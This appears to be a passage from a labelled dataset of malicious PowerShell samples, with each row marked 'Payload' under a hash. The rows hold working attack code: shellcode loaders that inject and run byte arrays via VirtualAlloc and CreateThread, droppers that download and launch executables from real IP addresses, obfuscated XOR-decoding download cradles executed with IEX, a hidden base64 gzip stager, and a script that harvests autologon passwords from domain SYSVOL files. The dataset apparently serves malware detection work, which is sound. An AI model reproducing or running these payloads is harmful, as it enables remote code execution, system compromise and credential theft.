$H9h = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $H9h -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x9a,0x79,0x2d,0x43,0xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x55,0x13,0x83,0xc5,0x04,0x03,0x55,0x95,0x9b,0xd8,0xbf,0x41,0xd9,0x23,0x40,0x91,0xbe,0xaa,0xa5,0xa0,0xfe,0xc9,0xae,0x92,0xce,0x9a,0xe3,0x1e,0xa4,0xcf,0x17,0x95,0xc8,0xc7,0x18,0x1e,0x66,0x3e,0x16,0x9f,0xdb,0x02,0x39,0x23,0x26,0x57,0x99,0x1a,0xe9,0xaa,0xd8,0x5b,0x14,0x46,0x88,0x34,0x52,0xf5,0x3d,0x31,0x2e,0xc6,0xb6,0x09,0xbe,0x4e,0x2a,0xd9,0xc1,0x7f,0xfd,0x52,0x98,0x5f,0xff,0xb7,0x90,0xe9,0xe7,0xd4,0x9d,0xa0,0x9c,0x2e,0x69,0x33,0x75,0x7f,0x92,0x98,0xb8,0xb0,0x61,0xe0,0xfd,0x76,0x9a,0x97,0xf7,0x85,0x27,0xa0,0xc3,0xf4,0xf3,0x25,0xd0,0x5e,0x77,0x9d,0x3c,0x5f,0x54,0x78,0xb6,0x53,0x11,0x0e,0x90,0x77,0xa4,0xc3,0xaa,0x83,0x2d,0xe2,0x7c,0x02,0x75,0xc1,0x58,0x4f,0x2d,0x68,0xf8,0x35,0x80,0x95,0x1a,0x96,0x7d,0x30,0x50,0x3a,0x69,0x49,0x3b,0x52,0x5e,0x60,0xc4,0xa2,0xc8,0xf3,0xb7,0x90,0x57,0xa8,0x5f,0x98,0x10,0x76,0xa7,0xdf,0x0a,0xce,0x37,0x1e,0xb5,0x2f,0x11,0xe4,0xe1,0x7f,0x09,0xcd,0x89,0xeb,0xc9,0xf2,0x5f,0x81,0xcc,0x64,0xa0,0xfe,0xce,0x39,0x48,0xfd,0xd0,0xc1,0xd8,0x88,0x37,0x91,0x88,0xda,0xe7,0x51,0x79,0x9b,0x57,0x39,0x93,0x14,0x87,0x59,0x9c,0xfe,0xa0,0xf3,0x73,0x57,0x98,0x6b,0xed,0xf2,0x52,0x0a,0xf2,0x28,0x1f,0x0c,0x78,0xdf,0xdf,0xc2,0x89,0xaa,0xf3,0xb2,0x79,0xe1,0xae,0x14,0x85,0xdf,0xc5,0x98,0x13,0xe4,0x4f,0xcf,0x8b,0xe6,0xb6,0x27,0x14,0x18,0x9d,0x3c,0x9d,0x8c,0x5e,0x2a,0xe2,0x40,0x5f,0xaa,0xb4,0x0a,0x5f,0xc2,0x60,0x6f,0x0c,0xf7,0x6e,0xba,0x20,0xa4,0xfa,0x45,0x11,0x19,0xac,0x2d,0x9f,0x44,0x9a,0xf1,0x60,0xa3,0x1a,0xcd,0xb6,0x8d,0x68,0x3f,0x0b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$KXAy=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($KXAy.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$KXAy,0,0,0);for (;;){Start-sleep 60};

",Payload
adeffa00d96e50a69bde640f9b4bca00be2ec8f4aa06a9827119ad857b45cd12,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
0e7844595390c1938852aec599c03e39447667a52a83307f3dab600b1ca7eb1d,"
[SYsteM.Net.SErviCePoInTMaNaGER]::EXPECt100CoNtINue = 0;$Wc=NEW-OBjeCt SyStEM.NEt.WEbCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDErS.ADd('User-Agent',$u);$wC.Proxy = [SYSTEm.NEt.WeBREquEsT]::DeFaulTWEBPrOxy;$wc.PRoXy.CREDENTiALS = [SYsTEM.NET.CReDEntIALCAChE]::DEFAultNetWorkCReDENtIaLs;$K='c5114664d5cae6566f528cd9f789363c';$I=0;[ChAr[]]$B=([ChAr[]]($WC.DOWnLoadStRinG(""http://192.168.0.10:8080/index.asp"")))|%{$_-BXOR$K[$i++%$k.LENgTh]};IEX ($b-joIn'')

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
39ba5404045d7c29dc9c800b6db9774cbd7dc0c59a0cdc8c2483dea04f5f71bf,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAL7ZvFcCA7VWf2/aSBD9O5X6HawKCVslGAhNmkiVbm1jIAECMZgARaeNvTYLi5fYa371+t1vDDihbVLlKp2ViF3PzO7bN2927MWBIygPJG/lYZ08GtK39+9O2jjEc0nOiHK1XePn85yUEdtKWzk5AWOGCudiWV9KXyR5hBYLg88xDcZXV3ochiQQ+3m+SgSKIjJ/YJREsiL9I/UnJCSntw9T4gjpm5T5O19l/AGzg9tGx86ESKcocBNbgzs4QZa3FowKOfv1a1YZnRbH+cpjjFkkZ61NJMg87zKWVaTvSrJhd7MgcrZJnZBH3BP5Pg3OSvleEGGPtGC1JWkSMeFulFXgIPAXEhGHgZQeKVlj7yFnYdgOuYNcNyQRBOTrwZLPiJwJYsZy0l/y6ADgLg4EnROwCxLyhUXCJXVIlK/hwGXkjnhjuUVW6bnfGiQfB4FXW4RKDlLyMtImd2NG9sFZ5VesT5lU4EmzCRx8f//u/Tsv1QDVp3qrOJzjYxHA6GS0GxOAKrd5RHfOX6RCTmrCjljwcAPTTDeMiTKWRkkWRuOxlGEXXu718GLqC5506EzZcjJZP4BhZHPqjiHwkKTMqmA1+HLQ1b3bVWJ/XXQG8WhAjE2A59RJdSW/xD/xGNmdOp+6tQCinD0YiGsQRnwsEjpz0ujXsMqciqdYLabMJSFyIIcRoIL0Kj+C2WdIztaDJpkDYft5FnLhgZpJ6n1Q8CbdPZmDU1ZnOIpyUjuGcnJykkUwI25OQkFEDyYUC74bZp/hNmMmqIMjkS43Vn7m87CvzoNIhLEDuQQOutaCOBSzhJKcVKMu0TYW9dP9sy8SomPGaODDSktICLxJiLBEopAQoCZqUPIWEfX5gpE5uOzK22TYh2I+1MNOUdgnbvY1oKno9wpPqEk5OYIJ+bYYFznJpqGA2yKh+Vlif4Tl6LL4AZUekkOa5LSeRtpGJAWQWdW2RlAamo/VZiLbA2U7gkIB5Jghn2s4IudlS4RAnfxBvaU6gmdQD1jT0Wa0iFa0WG/Cf4+e1blx4d5cT2tqaKwnHqpH9WatbXRqtfLy2rLLwqrUxU27LpqV++nUQrW73kAM66jWpYXZoLxdXNOt1UDuYK2eb7XtqqCtt1Pf9QaG5/kXnnVX/GTSRl/vaIUSbhiVuNHXVlqhHFXoqtahvc7s2hQPA5vhnqf698VLTNeNcGoXeXNbR6g6OXO2155dnTTdzaCmXvbLM1RBSA8qtqnxm4EWorZqY9/mqxtf00q+jjTToWTY6Zlap2NqqFedPhqXqg+x93ii9e0SHS7u7yYwNwHCjVoo112y5YMOkFTlCPt34OPrJWfigY/xEWkfWzwq4ZnGkQY+5vARcA0WZpuBvdsrcWSz1j1GjeHGVNXioF1GtQLtV32ULIl9rYNRtDS2hlq0Xe72P7UGnmrfswvV0LsLx1NVdVUzbpxhcf359uJzo0/tOUc9VbU/JDIBnWSC29k1ucNHKX/ttm/iMJpgBlKAOzytUZOH5uFGbnOaRMjyU3eekTAgDJoatL1U3Ygx7iTN4fn+hu607xljKNUeDM9KL44U6clReW4b6aurqyHAhXI5EnK+QQJfTHKF9VmhAB2gsC4X4OBvP6nOFxv5eMVc0khS0n7ajO02U5KqyjhdHl3+/6QeCnoCP+6bSH1+9xvrm4gu5J5o+MXy44v/xPgf0dDHVIC3BdcSI/ve+Rs2Dmo6+vLYZQtU4h2e5APwNhanLfgi+RcjBe71dQoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
4cc630c721afb07043958ce4493e1edbce7b27f4359c20abec0f3946a8fcf516,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xde,0xd9,0x74,0x24,0xf4,0xbd,0xa1,0x6e,0x32,0x3e,0x5a,0x33,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x6a,0x14,0x03,0x6a,0xb5,0x8c,0xc7,0xc2,0x5d,0xd2,0x28,0x3b,0x9d,0xb3,0xa1,0xde,0xac,0xf3,0xd6,0xab,0x9e,0xc3,0x9d,0xfe,0x12,0xaf,0xf0,0xea,0xa1,0xdd,0xdc,0x1d,0x02,0x6b,0x3b,0x13,0x93,0xc0,0x7f,0x32,0x17,0x1b,0xac,0x94,0x26,0xd4,0xa1,0xd5,0x6f,0x09,0x4b,0x87,0x38,0x45,0xfe,0x38,0x4d,0x13,0xc3,0xb3,0x1d,0xb5,0x43,0x27,0xd5,0xb4,0x62,0xf6,0x6e,0xef,0xa4,0xf8,0xa3,0x9b,0xec,0xe2,0xa0,0xa6,0xa7,0x99,0x12,0x5c,0x36,0x48,0x6b,0x9d,0x95,0xb5,0x44,0x6c,0xe7,0xf2,0x62,0x8f,0x92,0x0a,0x91,0x32,0xa5,0xc8,0xe8,0xe8,0x20,0xcb,0x4a,0x7a,0x92,0x37,0x6b,0xaf,0x45,0xb3,0x67,0x04,0x01,0x9b,0x6b,0x9b,0xc6,0x97,0x97,0x10,0xe9,0x77,0x1e,0x62,0xce,0x53,0x7b,0x30,0x6f,0xc5,0x21,0x97,0x90,0x15,0x8a,0x48,0x35,0x5d,0x26,0x9c,0x44,0x3c,0x2e,0x51,0x65,0xbf,0xae,0xfd,0xfe,0xcc,0x9c,0xa2,0x54,0x5b,0xac,0x2b,0x73,0x9c,0xd3,0x01,0xc3,0x32,0x2a,0xaa,0x34,0x1a,0xe8,0xfe,0x64,0x34,0xd9,0x7e,0xef,0xc4,0xe6,0xaa,0xa0,0x94,0x48,0x05,0x01,0x45,0x28,0xf5,0xe9,0x8f,0xa7,0x2a,0x09,0xb0,0x62,0x43,0xa0,0x4a,0xe4,0x3e,0xda,0xf7,0x55,0xd6,0x26,0xf8,0x84,0x7b,0xae,0x1e,0xcc,0x93,0xe6,0x89,0x78,0x0d,0xa3,0x42,0x19,0xd2,0x79,0x2f,0x19,0x58,0x8e,0xcf,0xd7,0xa9,0xfb,0xc3,0x8f,0x59,0xb6,0xbe,0x19,0x65,0x6c,0xd4,0xa5,0xf3,0x8b,0x7f,0xf2,0x6b,0x96,0xa6,0x34,0x34,0x69,0x8d,0x4f,0xfd,0xff,0x6e,0x27,0x02,0x10,0x6f,0xb7,0x54,0x7a,0x6f,0xdf,0x00,0xde,0x3c,0xfa,0x4e,0xcb,0x50,0x57,0xdb,0xf4,0x00,0x04,0x4c,0x9d,0xae,0x73,0xba,0x02,0x50,0x56,0x3a,0x7e,0x87,0x9e,0x48,0x6e,0x1b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
3f796c91ba6b5614e45b78d5d957ba62afe295e5eccaec9e3cc202400ab1f789,"
$Wc=NEw-ObjEct SysTEM.Net.WebClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeADErs.AdD('User-Agent',$u);$Wc.PROXy = [SySTEM.NEt.WEbReQuEsT]::DeFaUlTWEBProxy;$wc.PrOxy.CREDEntIalS = [SysTEM.NeT.CREDENTIALCaChe]::DEfAuLtNETWoRkCREDENTIaLs;$K='7b24afc8bc80e548d66c4e7ff72171c5';$i=0;[cHAR[]]$b=([ChAR[]]($Wc.DOwnLOadStRiNG(""http://192.168.1.19:8080/index.asp"")))|%{$_-bXOr$k[$i++%$k.LENgth]};IEX ($b-JoiN'')

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
2ab7a1d43c42564d8e02bb0952940187475983c5a55f018c805146c5e70d6a82,"function Get-GPPAutologon 
{

    
    [CmdletBinding()]
    Param ()
    
    
    Set-StrictMode -Version 2
    
    
    function Get-GPPInnerFields 
    {
    [CmdletBinding()]
        Param (
            $File 
        )
    
        try 
        {
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            
            $Password = @()
            $UserName = @()
            
            
            if (($Xml.innerxml -like ""*DefaultPassword*"") -and ($Xml.innerxml -like ""*DefaultUserName*""))
            {
                $props = $xml.GetElementsByTagName(""Properties"")
                foreach($prop in $props)
                {
                    switch ($prop.name) 
                    {
                        'DefaultPassword'
                        {
                            $Password += , $prop | Select-Object -ExpandProperty Value
                        }
                    
                        'DefaultUsername'
                        {
                            $Username += , $prop | Select-Object -ExpandProperty Value
                        }
                }

                    Write-Verbose ""Potential password in $File""
                }
                         
                
                if (!($Password)) 
                {
                    $Password = '[BLANK]'
                }

                if (!($UserName))
                {
                    $UserName = '[BLANK]'
                }
                       
                
                $ObjectProperties = @{'Passwords' = $Password;
                                      'UserNames' = $UserName;
                                      'File' = $File}
                    
                $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
                Write-Verbose ""The password is between {} and may be more than one value.""
                if ($ResultsObject)
                {
                    Return $ResultsObject
                } 
            }
        }
        catch {Write-Error $Error[0]}
    }

    try {
        
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }
    
        
        Write-Verbose 'Searching the DC. This could take a while.'
        $XMlFiles = Get-ChildItem -Path ""\\$Env:USERDNSDOMAIN\SYSVOL"" -Recurse -ErrorAction SilentlyContinue -Include 'Registry.xml'
    
        if ( -not $XMlFiles ) {throw 'No preference files found.'}

        Write-Verbose ""Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords.""
    
        foreach ($File in $XMLFiles) {
                $Result = (Get-GppInnerFields $File.Fullname)
                Write-Output $Result
        }
    }

    catch {Write-Error $Error[0]}
}",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
f150c926cfe5a29f0275f5e2736da8ce9eb5dacd9675fc7966611d6befe64ee7,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe', $env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )

",Payload
2061d98b6bb4f490a28cddec9454ee80bafe0a669fde6c44a8ae3262e3d0fb19,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
535455fd2b98fff0f3607b309dc7e45518d46d7416687f544e9abdfa48d481cb,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x1d,0xa0,0x86,0x2f,0xd9,0xca,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0x12,0x42,0x73,0xd3,0xc4,0x00,0x7c,0x2c,0x14,0x65,0xf4,0xc9,0x25,0xa5,0x62,0x99,0x15,0x15,0xe0,0xcf,0x99,0xde,0xa4,0xfb,0x2a,0x92,0x60,0x0b,0x9b,0x19,0x57,0x22,0x1c,0x31,0xab,0x25,0x9e,0x48,0xf8,0x85,0x9f,0x82,0x0d,0xc7,0xd8,0xff,0xfc,0x95,0xb1,0x74,0x52,0x0a,0xb6,0xc1,0x6f,0xa1,0x84,0xc4,0xf7,0x56,0x5c,0xe6,0xd6,0xc8,0xd7,0xb1,0xf8,0xeb,0x34,0xca,0xb0,0xf3,0x59,0xf7,0x0b,0x8f,0xa9,0x83,0x8d,0x59,0xe0,0x6c,0x21,0xa4,0xcd,0x9e,0x3b,0xe0,0xe9,0x40,0x4e,0x18,0x0a,0xfc,0x49,0xdf,0x71,0xda,0xdc,0xc4,0xd1,0xa9,0x47,0x21,0xe0,0x7e,0x11,0xa2,0xee,0xcb,0x55,0xec,0xf2,0xca,0xba,0x86,0x0e,0x46,0x3d,0x49,0x87,0x1c,0x1a,0x4d,0xcc,0xc7,0x03,0xd4,0xa8,0xa6,0x3c,0x06,0x13,0x16,0x99,0x4c,0xb9,0x43,0x90,0x0e,0xd5,0xa0,0x99,0xb0,0x25,0xaf,0xaa,0xc3,0x17,0x70,0x01,0x4c,0x1b,0xf9,0x8f,0x8b,0x5c,0xd0,0x68,0x03,0xa3,0xdb,0x88,0x0d,0x67,0x8f,0xd8,0x25,0x4e,0xb0,0xb2,0xb5,0x6f,0x65,0x2e,0xb3,0xe7,0x46,0x07,0xba,0xf5,0x2e,0x5a,0xbd,0xf8,0x15,0xd3,0x5b,0xaa,0x39,0xb4,0xf3,0x0a,0xea,0x74,0xa4,0xe2,0xe0,0x7a,0x9b,0x12,0x0b,0x51,0xb4,0xb8,0xe4,0x0c,0xec,0x54,0x9c,0x14,0x66,0xc5,0x61,0x83,0x02,0xc5,0xea,0x20,0xf2,0x8b,0x1a,0x4c,0xe0,0x7b,0xeb,0x1b,0x5a,0x2d,0xf4,0xb1,0xf1,0xd1,0x60,0x3e,0x50,0x86,0x1c,0x3c,0x85,0xe0,0x82,0xbf,0xe0,0x7b,0x0a,0x2a,0x4b,0x13,0x73,0xba,0x4b,0xe3,0x25,0xd0,0x4b,0x8b,0x91,0x80,0x1f,0xae,0xdd,0x1c,0x0c,0x63,0x48,0x9f,0x65,0xd0,0xdb,0xf7,0x8b,0x0f,0x2b,0x58,0x73,0x7a,0xad,0xa4,0xa2,0x42,0xdb,0xc4,0x76;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
